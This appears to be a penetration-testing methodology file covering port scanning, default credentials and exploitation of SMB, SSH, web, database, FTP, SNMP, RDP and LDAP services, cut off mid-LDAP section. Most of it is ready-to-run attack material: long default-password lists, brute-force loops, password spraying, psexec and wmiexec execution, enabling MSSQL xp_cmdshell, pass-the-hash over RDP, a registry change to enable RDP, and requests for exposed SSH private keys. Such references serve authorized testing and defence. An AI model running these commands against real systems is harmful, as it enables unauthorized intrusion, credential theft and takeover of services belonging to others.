@@ -1,0 +1,5299 @@
+# TCP/UDP Service Enumeration and Exploitation Methodology
+
+---
+
+## Default Credentials Quick Reference
+
+**Category:** Initial Access  
+**Description:** Common default credentials to test across various services. Always try these first during enumeration.
+
+### Database Services
+```bash
+# MySQL/MariaDB
+root:(blank)
+root:root
+root:toor
+root:password
+mysql:mysql
+admin:admin
+
+# PostgreSQL
+postgres:postgres
+postgres:password
+postgres:admin
+postgres:(blank)
+
+# MSSQL
+sa:(blank)
+sa:sa
+sa:password
+sa:Password123
+sa:SQLPassword
+BUILTIN\Administrators:(blank)
+
+# Oracle
+system:oracle
+system:password
+system:manager
+sys:sys
+sys:oracle
+sys:change_on_install
+scott:tiger
+hr:hr
+DBSNMP:DBSNMP
+CTXSYS:CTXSYS
+
+# MongoDB
+(no auth by default)
+admin:admin
+admin:password
+
+# Redis
+(no auth by default)
+default:redis
+admin:admin
+
+# Cassandra
+cassandra:cassandra
+admin:admin
+
+# CouchDB
+admin:admin
+admin:password
+(admin party mode - no auth)
+
+# Elasticsearch
+elastic:changeme
+elastic:elastic
+admin:admin
+(no auth by default)
+```
+
+### Web Application Servers
+```bash
+# Tomcat
+tomcat:tomcat
+admin:admin
+manager:manager
+role1:role1
+tomcat:s3cret
+admin:(blank)
+both:tomcat
+
+# WebLogic
+weblogic:weblogic
+weblogic:weblogic1
+weblogic:welcome1
+system:password
+system:manager
+system:Passw0rd
+admin:security
+admin:admin123
+
+# JBoss
+admin:admin
+jboss:jboss
+admin:jboss
+jbossadmin:jbossadmin
+
+# Jenkins
+admin:(blank)
+admin:password
+jenkins:jenkins
+admin:admin
+(no auth on many instances)
+
+# GitLab
+root:5iveL!fe
+root:password
+root:admin
+gitlab:gitlab
+admin@local.host:5iveL!fe
+
+# Splunk
+admin:changeme
+admin:admin
+splunk:changeme
+admin:splunk
+
+# Grafana
+admin:admin
+admin:grafana
+viewer:viewer
+editor:editor
+```
+
+### Network Devices & Services
+```bash
+# Cisco
+cisco:cisco
+admin:cisco
+admin:admin
+(blank):cisco
+(blank):password
+admin:changeme
+enable:(blank)
+enable:cisco
+
+# HP/Aruba
+admin:admin
+admin:(blank)
+manager:manager
+admin:hp
+admin:password
+
+# Juniper
+root:(blank)
+admin:abc123
+admin:juniper
+super:juniper
+
+# SNMP Community Strings
+public
+private
+cisco
+admin
+password
+default
+```
+
+### Monitoring & Management
+```bash
+# Nagios
+nagiosadmin:nagios
+nagiosadmin:nagiosadmin
+admin:admin
+nagios:nagios
+root:nagios
+
+# Zabbix
+Admin:zabbix (capital A)
+admin:admin
+guest:(blank)
+zabbix:zabbix
+
+# Prometheus
+(no auth by default)
+admin:admin
+prometheus:prometheus
+
+# Consul
+(no auth by default)
+admin:admin
+consul:consul
+
+# Vault
+root:<root_token>
+(token from init)
+```
+
+### Messaging Services
+```bash
+# RabbitMQ
+guest:guest
+admin:admin
+rabbitmq:rabbitmq
+admin:password
+
+# ActiveMQ
+admin:admin
+user:password
+system:manager
+admin:password
+
+# Kafka
+(no auth by default)
+admin:admin
+kafka:kafka
+
+# MQTT
+admin:admin
+admin:password
+mosquitto:mosquitto
+(no auth common)
+```
+
+### VoIP/Communication
+```bash
+# Asterisk
+admin:admin
+admin:password
+asterisk:asterisk
+admin:amp111
+admin:amps
+
+# FreePBX
+admin:admin
+asterisk:asterisk
+admin:freepbx
+```
+
+### Remote Access Services
+```bash
+# VNC
+(blank password)
+password
+vnc
+admin
+1234
+default
+
+# RDP
+Administrator:(blank)
+Administrator:password
+Administrator:admin
+admin:admin
+guest:guest
+
+# SSH (IoT/Embedded)
+root:root
+root:admin
+root:password
+root:toor
+admin:admin
+admin:password
+admin:1234
+pi:raspberry
+ubuntu:ubuntu
+
+# WinRM
+Administrator:admin
+admin:admin
+Administrator:password
+```
+
+### Container/Cloud Services
+```bash
+# Docker Registry
+admin:admin
+docker:docker
+registry:registry
+
+# Kubernetes
+admin:admin
+kubernetes:kubernetes
+system:admin:password
+
+# VMware vSphere
+root:vmware
+administrator@vsphere.local:vmware
+admin:admin
+root:password
+
+# Proxmox
+root:admin
+root:proxmox
+admin:admin
+```
+
+### Storage Systems
+```bash
+# NAS Devices (Synology/QNAP)
+admin:admin
+admin:(blank)
+admin:password
+admin:synology
+admin:qnap
+
+# Dell iDRAC
+root:calvin
+admin:admin
+admin:password
+
+# HP iLO
+Administrator:password
+Administrator:admin
+admin:admin
+admin:hpinvent
+
+# IPMI/BMC
+ADMIN:ADMIN
+admin:admin
+root:root
+root:calvin
+admin:password
+```
+
+### IoT/Embedded Devices
+```bash
+# Routers (Generic)
+admin:admin
+admin:password
+admin:(blank)
+(blank):admin
+admin:1234
+user:user
+support:support
+
+# IP Cameras
+admin:admin
+admin:12345
+admin:(blank)
+root:admin
+admin:password
+admin:4321
+666666:666666
+888888:888888
+
+# Printers
+admin:admin
+admin:(blank)
+admin:1234
+epson:epson
+admin:access
+```
+
+### Application Specific
+```bash
+# Jupyter Notebook
+(token in console output)
+admin:admin
+jupyter:jupyter
+
+# Hadoop
+hdfs:(no password)
+hadoop:hadoop
+admin:admin
+
+# Solr
+solr:SolrRocks
+admin:admin
+(no auth by default)
+
+# phpMyAdmin
+root:(blank)
+root:password
+pma:password
+admin:admin
+
+# WordPress
+admin:admin
+admin:password
+admin:demo
+wp-admin:admin
+```
+
+### Testing Script Template
+```bash
+#!/bin/bash
+# Quick default credential checker
+
+TARGET_IP="<TARGET_IP>"
+SERVICE_PORT="<PORT>"
+SERVICE_TYPE="<SERVICE>"
+
+# Define credential arrays based on service
+declare -a USERS=("admin" "root" "administrator" "user")
+declare -a PASSWORDS=("admin" "password" "" "123456" "default")
+
+echo "[*] Testing default credentials for $SERVICE_TYPE on $TARGET_IP:$SERVICE_PORT"
+
+for user in "${USERS[@]}"; do
+    for pass in "${PASSWORDS[@]}"; do
+        echo "[+] Trying $user:$pass"
+        
+        # Add service-specific testing commands here
+        case $SERVICE_TYPE in
+            "ssh")
+                sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$TARGET_IP" -p "$SERVICE_PORT" "exit" 2>/dev/null && echo "[!] SUCCESS: $user:$pass"
+                ;;
+            "ftp")
+                echo -e "USER $user\nPASS $pass\nQUIT" | nc -w 3 "$TARGET_IP" "$SERVICE_PORT" | grep -q "230" && echo "[!] SUCCESS: $user:$pass"
+                ;;
+            "mysql")
+                mysql -h "$TARGET_IP" -P "$SERVICE_PORT" -u "$user" -p"$pass" -e "SELECT 1" 2>/dev/null && echo "[!] SUCCESS: $user:$pass"
+                ;;
+            # Add more services as needed
+        esac
+    done
+done
+```
+
+### Automated Tools for Default Credentials
+```bash
+# Hydra with default password lists
+hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/default-passwords.txt <TARGET_IP> <SERVICE>
+
+# Metasploit auxiliary modules
+use auxiliary/scanner/ssh/ssh_login
+set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
+set PASS_FILE /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt
+
+# Nmap NSE scripts
+nmap --script default-http-auth <TARGET_IP>
+nmap --script ssh-brute <TARGET_IP>
+nmap --script ftp-brute <TARGET_IP>
+
+# Default credential wordlists locations
+/usr/share/wordlists/SecLists/Passwords/Default-Credentials/
+/usr/share/metasploit-framework/data/wordlists/
+/usr/share/nmap/nselib/data/passwords.lst
+/usr/share/nmap/nselib/data/usernames.lst
+
+# Online resources
+https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
+https://cirt.net/passwords
+https://default-password.info/
+```
+
+### Important Notes on Default Credentials
+1. **Always try blank passwords** - Many services allow empty passwords
+2. **Try username as password** - Common pattern (e.g., oracle:oracle)
+3. **Check version-specific defaults** - Different versions may have different defaults
+4. **Consider the context** - Enterprise vs SOHO defaults differ
+5. **Test case variations** - Admin vs admin vs ADMIN
+6. **Try service name** - Service name often used as password
+7. **Check documentation** - Vendor documentation often lists defaults
+8. **Regional variations** - Some vendors use region-specific defaults
+
+---
+
+## 1. Initial Port Scanning and Service Discovery
+
+**Category:** Network Enumeration  
+**Description:** Perform comprehensive port scanning to identify open TCP/UDP services and their versions.
+
+**Tools Required:**
+- nmap
+- masscan
+- unicornscan
+- netcat
+
+**Steps/Commands:**
+```bash
+# Quick TCP scan (top 1000 ports)
+nmap -sS -sV -sC -O -oA <OUTPUT_FILENAME> <TARGET_IP>
+
+# Full TCP port scan
+nmap -sS -sV -p- -T4 -oA <OUTPUT_FILENAME>_full <TARGET_IP>
+
+# UDP scan (slower, top 1000)
+sudo nmap -sU -sV --top-ports 1000 -oA <OUTPUT_FILENAME>_udp <TARGET_IP>
+
+# Fast scanning with masscan
+sudo masscan -p1-65535 <TARGET_IP_RANGE> --rate=<PACKETS_PER_SEC> -oL <OUTPUT_FILE>
+
+# Service version detection
+nmap -sV --version-intensity 9 -p <PORT_LIST> <TARGET_IP>
+
+# Script scanning for vulnerabilities
+nmap --script=vuln -p <PORT_LIST> <TARGET_IP>
+
+# Aggressive scan (OS, version, scripts, traceroute)
+nmap -A -T4 -p <PORT_LIST> <TARGET_IP>
+
+# Scan multiple hosts
+nmap -sS -sV -iL <TARGET_LIST_FILE> -oA <OUTPUT_FILENAME>
+
+# UDP specific services
+nmap -sU -p 53,67,68,69,123,161,500,514,520,1900 <TARGET_IP>
+```
+
+**Pitfalls:**
+- IDS/IPS detection and blocking
+- Rate limiting causing incomplete results
+- UDP scanning extremely slow
+- Firewall filtering responses
+- Service crashes from aggressive scanning
+
+**Cleanup Steps:**
+```bash
+# No cleanup typically needed
+# If service crashed, note in report
+```
+
+**Suggested Findings:**
+- Unnecessary services exposed
+- Outdated service versions
+- Lack of network segmentation
+- Missing host-based firewalls
+
+**Conditions When to Try:**
+- Network access obtained
+- Starting service enumeration
+- Mapping attack surface
+- Identifying vulnerable services
+
+---
+
+## 2. SMB Enumeration and Exploitation (445/tcp, 139/tcp)
+
+**Category:** Windows Services  
+**Description:** Enumerate and exploit SMB services for information disclosure and access.
+
+**Default Credentials to Try:**
+```bash
+# Windows systems
+Administrator:(blank)
+Administrator:password
+Administrator:admin
+admin:admin
+Guest:(blank)
+# Domain environments
+DOMAIN\Administrator:Password1
+DOMAIN\admin:admin
+```
+
+**Tools Required:**
+- enum4linux/enum4linux-ng
+- smbclient
+- smbmap
+- crackmapexec
+- impacket tools
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Test default credentials first
+crackmapexec smb <TARGET_IP> -u Administrator -p ''
+crackmapexec smb <TARGET_IP> -u Guest -p ''
+crackmapexec smb <TARGET_IP> -u admin -p admin
+
+# Basic enumeration
+enum4linux -a <TARGET_IP>
+enum4linux-ng -A <TARGET_IP>
+
+# List shares
+smbclient -L \\\\<TARGET_IP> -N
+smbmap -H <TARGET_IP>
+crackmapexec smb <TARGET_IP> --shares
+
+# Check for null sessions
+smbclient ///<TARGET_IP>/IPC$ -N
+rpcclient -U "" -N <TARGET_IP>
+
+# Authenticated enumeration
+smbmap -H <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --shares --users
+
+# Check for vulnerabilities
+nmap --script smb-vuln* -p 445 <TARGET_IP>
+
+# EternalBlue check (MS17-010)
+nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
+crackmapexec smb <TARGET_IP> -u '' -p '' -M ms17-010
+
+# Extract user list
+rpcclient -U "" <TARGET_IP> -N -c "enumdomusers"
+enum4linux -U <TARGET_IP>
+
+# Password spraying (including defaults)
+echo -e "admin\npassword\n(blank)\nPassword1" > default_pass.txt
+crackmapexec smb <TARGET_IP> -u <USER_LIST> -p default_pass.txt
+
+# Execute commands (if creds obtained)
+impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+```
+
+**Pitfalls:**
+- Account lockout from password attempts
+- SMB signing prevents relay attacks
+- Modern Windows versions patch most vulns
+- AV detection of exploit attempts
+- Honeypot shares trigger alerts
+
+**Cleanup Steps:**
+```bash
+# Disconnect SMB sessions
+smbclient -L \\\\<TARGET_IP> -U <USERNAME> -c "quit"
+# Clear cached credentials if any
+```
+
+**Suggested Findings:**
+- Null session enumeration allowed
+- Weak SMB signing configuration
+- Unpatched SMB vulnerabilities
+- Excessive share permissions
+- Guest access enabled
+
+**Conditions When to Try:**
+- Port 445/139 open
+- Windows environment suspected
+- Need user enumeration
+- Lateral movement phase
+
+---
+
+## 3. SSH Enumeration and Exploitation (22/tcp)
+
+**Category:** Remote Access Services  
+**Description:** Enumerate SSH service for weak configurations and credential attacks.
+
+**Default Credentials to Try:**
+```bash
+# Common defaults
+root:root
+root:toor
+root:password
+root:admin
+admin:admin
+admin:password
+pi:raspberry         # Raspberry Pi
+ubuntu:ubuntu       # Ubuntu clouds
+kali:kali          # Kali Linux
+vagrant:vagrant    # Vagrant boxes
+```
+
+**Tools Required:**
+- ssh-audit
+- hydra
+- medusa
+- metasploit
+- nmap
+
+**Steps/Commands:**
+```bash
+# Test default credentials first
+ssh root@<TARGET_IP>  # Try: root, toor, password
+ssh admin@<TARGET_IP> # Try: admin, password
+
+# Quick default credential check
+for user in root admin pi ubuntu; do
+    for pass in root admin password toor raspberry ubuntu; do
+        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@<TARGET_IP>" "exit" 2>/dev/null && echo "[!] Found: $user:$pass"
+    done
+done
+
+# SSH version and cipher enumeration
+nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
+ssh-audit <TARGET_IP>
+
+# Banner grabbing
+nc -nv <TARGET_IP> 22
+nmap -sV -p 22 <TARGET_IP>
+
+# Check for weak credentials (including defaults)
+echo -e "root\nadmin\npassword\ntoor\nchangeme" > ssh_defaults.txt
+hydra -L <USER_LIST> -P ssh_defaults.txt ssh://<TARGET_IP>
+medusa -h <TARGET_IP> -U <USER_LIST> -P ssh_defaults.txt -M ssh
+
+# Username enumeration (if vulnerable)
+python ssh_user_enum.py -u <USER_LIST> <TARGET_IP>
+msfconsole -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <TARGET_IP>; set USER_FILE <USER_LIST>; run"
+
+# Check for SSH keys
+# If web server found, look for:
+curl http://<TARGET_IP>/.ssh/id_rsa
+curl http://<TARGET_IP>/user/.ssh/authorized_keys
+
+# Test for CVE-2018-10933 (LibSSH auth bypass)
+nmap -p 22 --script ssh-auth-methods <TARGET_IP>
+
+# Brute force with common keys
+ssh -i <PRIVATE_KEY_FILE> <USERNAME>@<TARGET_IP>
+
+# Check SSH config issues
+ssh -v -o PreferredAuthentications=none <TARGET_IP>
+ssh -v -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null <TARGET_IP>
+```
+
+**Pitfalls:**
+- Account lockout policies
+- Fail2ban/DenyHosts blocking
+- Key-only authentication
+- Rate limiting
+- IDS alerts on brute force
+
+**Cleanup Steps:**
+```bash
+# Clear known_hosts if added
+ssh-keygen -R <TARGET_IP>
+```
+
+**Suggested Findings:**
+- Weak SSH passwords
+- SSH version 1 enabled
+- Weak encryption algorithms
+- User enumeration possible
+- Default credentials
+
+**Conditions When to Try:**
+- SSH service identified
+- Need remote access
+- Password policy weak
+- Public key exposure suspected
+
+---
+
+## 4. Web Service Enumeration (80/tcp, 443/tcp, 8080/tcp, 8443/tcp)
+
+**Category:** Web Services  
+**Description:** Enumerate web services for technologies, vulnerabilities, and hidden content.
+
+**Tools Required:**
+- gobuster/dirbuster
+- nikto
+- whatweb
+- wfuzz
+- burpsuite
+- sqlmap
+
+**Steps/Commands:**
+```bash
+# Technology identification
+whatweb <TARGET_URL>
+nmap -p <PORT> --script http-enum,http-headers,http-methods <TARGET_IP>
+
+# Directory/file enumeration
+gobuster dir -u http://<TARGET_IP>:<PORT> -w <WORDLIST_PATH> -x php,asp,aspx,jsp,html,txt,conf,config
+feroxbuster -u http://<TARGET_IP>:<PORT> -w <WORDLIST_PATH>
+wfuzz -c -z file,<WORDLIST_PATH> --hc 404 http://<TARGET_IP>:<PORT>/FUZZ
+
+# Vulnerability scanning
+nikto -h http://<TARGET_IP>:<PORT>
+
+# Find hidden parameters
+wfuzz -c -z file,<PARAM_WORDLIST> --hc 404 "http://<TARGET_IP>:<PORT>/index.php?FUZZ=test"
+arjun -u http://<TARGET_IP>:<PORT>/<ENDPOINT>
+
+# Check for common vulnerabilities
+# SQL Injection
+sqlmap -u "http://<TARGET_IP>:<PORT>/page.php?id=1" --batch --banner
+
+# Check HTTP methods
+curl -X OPTIONS http://<TARGET_IP>:<PORT>/ -v
+nmap -p <PORT> --script http-methods --script-args http-methods.url-path='/<PATH>' <TARGET_IP>
+
+# Subdomain enumeration
+gobuster vhost -u http://<TARGET_IP> -w <SUBDOMAIN_WORDLIST>
+wfuzz -c -w <SUBDOMAIN_WORDLIST> -H "Host: FUZZ.<TARGET_DOMAIN>" http://<TARGET_IP>
+
+# Technology-specific enumeration
+# WordPress
+wpscan --url http://<TARGET_IP>:<PORT> --enumerate ap,at,u
+
+# Drupal
+droopescan scan drupal -u http://<TARGET_IP>:<PORT>
+
+# Joomla
+joomscan -u http://<TARGET_IP>:<PORT>
+```
+
+**Pitfalls:**
+- WAF blocking scan attempts
+- Rate limiting
+- Large sites timeout scans
+- Dynamic content false positives
+- Scan crashes application
+
+**Cleanup Steps:**
+```bash
+# Remove any uploaded test files
+curl -X DELETE http://<TARGET_IP>:<PORT>/<UPLOADED_FILE>
+# Clear session cookies
+```
+
+**Suggested Findings:**
+- Directory listing enabled
+- Sensitive files exposed
+- Outdated web technologies
+- SQL injection vulnerabilities
+- Missing security headers
+
+**Conditions When to Try:**
+- Web ports identified open
+- Web application assessment
+- Looking for entry points
+- Technology stack identification needed
+
+---
+
+## 5. Database Service Exploitation (1433/tcp, 3306/tcp, 5432/tcp, 1521/tcp)
+
+**Category:** Database Services  
+**Description:** Enumerate and exploit common database services for unauthorized access.
+
+**Default Credentials to Try:**
+```bash
+# MySQL
+root:(blank)
+root:root
+root:password
+mysql:mysql
+
+# MSSQL
+sa:(blank)
+sa:sa
+sa:password
+sa:Password123
+
+# PostgreSQL
+postgres:postgres
+postgres:password
+
+# Oracle
+system:oracle
+system:manager
+scott:tiger
+```
+
+**Tools Required:**
+- hydra
+- nmap
+- metasploit
+- mysql client
+- sqlcmd/tsql
+- psql
+- sqlplus
+
+**Steps/Commands:**
+```bash
+# MySQL (3306/tcp)
+# Test defaults first
+mysql -h <TARGET_IP> -u root          # blank password
+mysql -h <TARGET_IP> -u root -proot
+mysql -h <TARGET_IP> -u root -ppassword
+
+nmap -p 3306 --script mysql-info,mysql-enum,mysql-brute <TARGET_IP>
+hydra -L <USER_LIST> -P <PASSWORD_LIST> <TARGET_IP> mysql
+mysql -h <TARGET_IP> -u root -p
+# Once connected:
+SHOW DATABASES;
+SELECT user,password FROM mysql.user;
+
+# MSSQL (1433/tcp)
+# Test defaults first
+impacket-mssqlclient sa:@<TARGET_IP>        # blank password
+impacket-mssqlclient sa:sa@<TARGET_IP>
+impacket-mssqlclient sa:Password123@<TARGET_IP>
+
+nmap -p 1433 --script ms-sql-info,ms-sql-brute,ms-sql-config <TARGET_IP>
+hydra -L <USER_LIST> -P <PASSWORD_LIST> <TARGET_IP> mssql
+# Using impacket
+impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+# Enable xp_cmdshell if possible
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
+# PostgreSQL (5432/tcp)
+# Test defaults first
+PGPASSWORD=postgres psql -h <TARGET_IP> -U postgres
+PGPASSWORD=password psql -h <TARGET_IP> -U postgres
+
+nmap -p 5432 --script pgsql-brute <TARGET_IP>
+hydra -L <USER_LIST> -P <PASSWORD_LIST> <TARGET_IP> postgres
+psql -h <TARGET_IP> -U postgres -W
+# Once connected:
+\l  # List databases
+\du # List users
+SELECT version();
+
+# Oracle (1521/tcp)
+# Test defaults first
+sqlplus system/oracle@<TARGET_IP>:1521/<SID>
+sqlplus system/manager@<TARGET_IP>:1521/<SID>
+sqlplus scott/tiger@<TARGET_IP>:1521/<SID>
+
+nmap -p 1521 --script oracle-sid-brute,oracle-brute <TARGET_IP>
+# Using odat
+odat all -s <TARGET_IP> -p 1521
+# Guess SIDs
+hydra -L <SID_LIST> <TARGET_IP> oracle-sid
+# Connect
+sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>:1521/<SID>
+
+# MongoDB (27017/tcp)
+# Usually no auth by default
+mongo --host <TARGET_IP> --port 27017
+# Once connected:
+show dbs
+use <DATABASE>
+show collections
+
+# Default credential testing script
+cat > test_db_defaults.sh << 'EOF'
+#!/bin/bash
+echo "[*] Testing MySQL..."
+mysql -h <TARGET_IP> -u root 2>/dev/null && echo "[!] MySQL: root with no password"
+mysql -h <TARGET_IP> -u root -proot -e "SELECT 1" 2>/dev/null && echo "[!] MySQL: root:root"
+
+echo "[*] Testing PostgreSQL..."
+PGPASSWORD=postgres psql -h <TARGET_IP> -U postgres -c "SELECT 1" 2>/dev/null && echo "[!] PostgreSQL: postgres:postgres"
+
+echo "[*] Testing MSSQL..."
+impacket-mssqlclient sa:@<TARGET_IP> -q "SELECT 1" 2>/dev/null && echo "[!] MSSQL: sa with no password"
+impacket-mssqlclient sa:sa@<TARGET_IP> -q "SELECT 1" 2>/dev/null && echo "[!] MSSQL: sa:sa"
+EOF
+```
+
+**Pitfalls:**
+- Account lockout on failed attempts
+- Network-level access restrictions
+- Encrypted connections required
+- Complex password policies
+- Audit logging of access attempts
+
+**Cleanup Steps:**
+```bash
+# Close database connections
+# Remove any test databases/tables created
+DROP DATABASE testdb;
+# Clear command history
+```
+
+**Suggested Findings:**
+- Default database credentials
+- Weak password policy
+- Unnecessary network exposure
+- Missing encryption (TLS)
+- Excessive user privileges
+
+**Conditions When to Try:**
+- Database ports identified
+- Backend access needed
+- Credential testing required
+- Post-exploitation data access
+
+---
+
+## 6. FTP Service Exploitation (21/tcp)
+
+**Category:** File Transfer Services  
+**Description:** Exploit FTP services for anonymous access, weak credentials, and bounce attacks.
+
+**Tools Required:**
+- ftp client
+- hydra
+- nmap
+- metasploit
+- curl
+
+**Steps/Commands:**
+```bash
+# Check for anonymous access
+ftp <TARGET_IP>
+# Username: anonymous
+# Password: anonymous@test.com
+
+# Automated anonymous check
+nmap -p 21 --script ftp-anon <TARGET_IP>
+
+# Banner grabbing and version
+nc -nv <TARGET_IP> 21
+nmap -sV -p 21 <TARGET_IP>
+
+# Brute force credentials
+hydra -L <USER_LIST> -P <PASSWORD_LIST> ftp://<TARGET_IP>
+
+# Check for vulnerabilities
+nmap -p 21 --script ftp-vuln* <TARGET_IP>
+
+# FTP bounce attack check
+nmap -p 21 --script ftp-bounce <TARGET_IP>
+
+# Check for writable directories
+ftp <TARGET_IP>
+> ls -la
+> cd <DIRECTORY>
+> put test.txt
+> delete test.txt
+
+# Download entire FTP
+wget -r ftp://anonymous:anonymous@<TARGET_IP>/
+
+# Check for FTP over TLS
+openssl s_client -connect <TARGET_IP>:21 -starttls ftp
+
+# ProFTPd mod_copy exploit
+nmap -p 21 --script ftp-proftpd-backdoor <TARGET_IP>
+
+# vsftpd 2.3.4 backdoor
+telnet <TARGET_IP> 6200
+```
+
+**Pitfalls:**
+- Large file downloads trigger alerts
+- Active vs passive mode issues
+- Chroot restrictions
+- IP-based access controls
+- Binary vs ASCII transfer corruption
+
+**Cleanup Steps:**
+```bash
+# Remove uploaded test files
+ftp <TARGET_IP>
+> delete <TEST_FILE>
+> quit
+```
+
+**Suggested Findings:**
+- Anonymous FTP access enabled
+- Weak FTP credentials
+- World-writable directories
+- FTP bounce attack possible
+- Unencrypted transmission
+
+**Conditions When to Try:**
+- FTP service identified
+- File transfer needed
+- Looking for data exposure
+- Legacy system assessment
+
+---
+
+## 7. SNMP Enumeration and Exploitation (161/udp, 162/udp)
+
+**Category:** Network Management  
+**Description:** Enumerate SNMP services for information disclosure and configuration access.
+
+**Tools Required:**
+- snmpwalk
+- snmp-check
+- onesixtyone
+- nmap
+- metasploit
+
+**Steps/Commands:**
+```bash
+# Check for default community strings
+onesixtyone -c <COMMUNITY_LIST> <TARGET_IP>
+nmap -sU -p 161 --script snmp-brute <TARGET_IP>
+
+# Enumerate with public string
+snmpwalk -v 1 -c public <TARGET_IP>
+snmpwalk -v 2c -c public <TARGET_IP>
+
+# Comprehensive enumeration
+snmp-check <TARGET_IP>
+
+# Specific OIDs
+# System info
+snmpwalk -v 2c -c public <TARGET_IP> 1.3.6.1.2.1.1.1.0
+# User accounts
+snmpwalk -v 2c -c public <TARGET_IP> 1.3.6.1.4.1.77.1.2.25
+# Running processes
+snmpwalk -v 2c -c public <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2
+# Installed software
+snmpwalk -v 2c -c public <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2
+# Network interfaces
+snmpwalk -v 2c -c public <TARGET_IP> 1.3.6.1.2.1.2.2.1
+
+# SNMPv3 enumeration
+nmap -sU -p 161 --script snmp-info <TARGET_IP>
+snmpwalk -v 3 -u <USERNAME> -l authPriv -a SHA -A <AUTH_PASS> -x AES -X <PRIV_PASS> <TARGET_IP>
+
+# Write access test (dangerous)
+snmpset -v 2c -c private <TARGET_IP> 1.3.6.1.2.1.1.6.0 s "New Location"
+
+# Metasploit modules
+msfconsole -x "use auxiliary/scanner/snmp/snmp_enum; set RHOSTS <TARGET_IP>; run"
+```
+
+**Pitfalls:**
+- Community string lockout
+- ACLs limiting access
+- SNMPv3 encryption
+- Incomplete MIB trees
+- Network filtering of SNMP
+
+**Cleanup Steps:**
+```bash
+# No cleanup typically needed
+# If config changed via SNMP write, restore:
+snmpset -v 2c -c private <TARGET_IP> <OID> <TYPE> "<ORIGINAL_VALUE>"
+```
+
+**Suggested Findings:**
+- Default SNMP community strings
+- SNMP write access enabled
+- Information disclosure via SNMP
+- SNMPv1/v2 instead of v3
+- No ACLs on SNMP
+
+**Conditions When to Try:**
+- UDP 161 responsive
+- Network device assessment
+- Information gathering phase
+- Windows/Linux enumeration alternative
+
+---
+
+## 8. RDP Service Exploitation (3389/tcp)
+
+**Category:** Remote Access Services  
+**Description:** Enumerate and exploit Remote Desktop Protocol services.
+
+**Tools Required:**
+- nmap
+- hydra
+- rdesktop
+- xfreerdp
+- metasploit
+- crowbar
+
+**Steps/Commands:**
+```bash
+# Enumerate RDP
+nmap -p 3389 --script rdp-ntlm-info <TARGET_IP>
+nmap -p 3389 --script rdp-enum-encryption <TARGET_IP>
+
+# Check for BlueKeep (CVE-2019-0708)
+nmap -p 3389 --script rdp-vuln-ms12-020 <TARGET_IP>
+msfconsole -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS <TARGET_IP>; run"
+
+# Brute force credentials
+hydra -L <USER_LIST> -P <PASSWORD_LIST> rdp://<TARGET_IP>
+crowbar -b rdp -s <TARGET_IP>/32 -u <USERNAME> -C <PASSWORD_LIST>
+
+# Connect with known creds
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP>
+rdesktop -u <USERNAME> -p <PASSWORD> <TARGET_IP>
+
+# Session hijacking check
+# If admin creds obtained:
+query user
+tscon <SESSION_ID> /dest:console
+
+# Enable RDP if disabled (need shell access)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+
+# Check for NLA
+xfreerdp /v:<TARGET_IP> +auth-only
+
+# Pass the hash with RDP
+xfreerdp /u:<USERNAME> /pth:<NTLM_HASH> /v:<TARGET_IP>
+```
+
+**Pitfalls:**
+- Account lockout on failed attempts
+- NLA prevents exploitation
+- Network Level Authentication
+- Session recording/monitoring
+- Smart card authentication
+
+**Cleanup Steps:**
+```bash
+# Logout RDP sessions properly
+logoff
+# Clear cached credentials
+cmdkey /delete:TERMSRV/<TARGET_IP>
+```
+
+**Suggested Findings:**
+- Weak RDP credentials
+- BlueKeep vulnerability
+- NLA not enforced
+- Weak encryption settings
+- RDP exposed to internet
+
+**Conditions When to Try:**
+- Port 3389 open
+- Windows targets
+- Need GUI access
+- Password spraying authorized
+
+---
+
+## 9. LDAP Service Enumeration (389/tcp, 636/tcp, 3268/tcp)
+
+**Category:** Directory Services  
+**Description:** Enumerate LDAP/Active Directory services for user and system information.
+
+**Tools Required:**
+- ldapsearch
+- ldapenum
+- nmap
+- bloodhound
+- impacket
+
+**Steps/Commands:**
+```bash
+# Anonymous bind check
+ldapsearch -x -h <TARGET_IP> -s base
+ldapsearch -x -h <TARGET_IP> -b "dc=<DOMAIN>,dc=<COM>" "(objectclass=*)"
+
+# Enumerate naming contexts
+ldapsearch -x -h <TARGET_IP> -s base namingContexts
+
+# User enumeration
+ldapsearch -x -h <TARGET_IP> -b "dc=<DOMAIN>,dc=<COM>" "(objectClass=user)" sAMAccountName
+ldapsearch -x -h <TARGET_IP> -b "dc=<DOMAIN>,dc=<COM>" "(objectClass=person)"
+
+# Get domain info
+nmap -p 389 --script ldap-rootdse <TARGET_IP>
+nmap -p 389 --script ldap-search --script-args 'ldap.username="",ldap.password=""' <TARGET_IP>
+
+# Authenticated enumeration
+ldapsearch -x -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> -h <TARGET_IP> -b "dc=<DOMAIN>,dc=<COM>"
+
+# Dump all objects
